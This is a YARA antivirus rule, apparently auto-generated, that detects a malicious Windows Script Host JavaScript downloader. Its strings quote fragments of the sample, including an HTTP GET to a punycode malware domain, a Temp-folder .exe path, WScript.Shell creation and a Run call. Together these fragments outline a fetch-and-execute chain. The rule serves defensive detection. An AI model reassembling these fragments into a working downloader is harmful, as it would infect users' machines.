rule sig_20160329_24c57d637967385e83d79dfd05c6dd56 {
  meta:
    description = "datamaliciousorder - file 20160329_24c57d637967385e83d79dfd05c6dd56.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "67ae03a938eada9b12bda50cfeee6dfed79ec8dbbf224ba06a6b1e8feee68b62"

  strings:
    $s1  = "Y[Fr](\"GET\", \"http://xn--kandypriv-j4a.com/lo4sad\", false);" fullword ascii
    $s2  = "function D() {return rI[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"kY6tZ4JofFNVy.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[q](eb() * 11); if (Y[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function e(Aa, l0){qL = qL * 1; return Aa - l0;};" fullword ascii
    $s5  = "var rI = function IS() {return WScript[aH](\"WScript.Shell\");}(), MM = 11;" fullword ascii
    $s6  = "function l(){return \"\" + WE;};" fullword ascii
    $s7  = "function y() {return ((c == true) && (c == mX)) ? 1 : qL;};" fullword ascii
    $s8  = "function E(B0){rI[\"Run\"](B0, qL, qL);};" fullword ascii
    $s9  = "function eb(){return 22;};" fullword ascii
    $s10 = "var Q = new this[\"Date\"]();" fullword ascii
    $s11 = "return e(hF, D0);" fullword ascii
    $s12 = "function YB()" fullword ascii
    $s13 = "function PV(mQ) {var xM = (1, 2, 3, 4, 5, mQ); return xM;};" fullword ascii
    $s14 = "function qd(){return aH;};" fullword ascii
    $s15 = " while (B){" fullword ascii
    $s16 = "var c = false;" fullword ascii
    $s17 = "c = true; " fullword ascii
    $s18 = "var mX = false;" fullword ascii
    $s19 = "mX = true; " fullword ascii
    $s20 = "var E0 = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}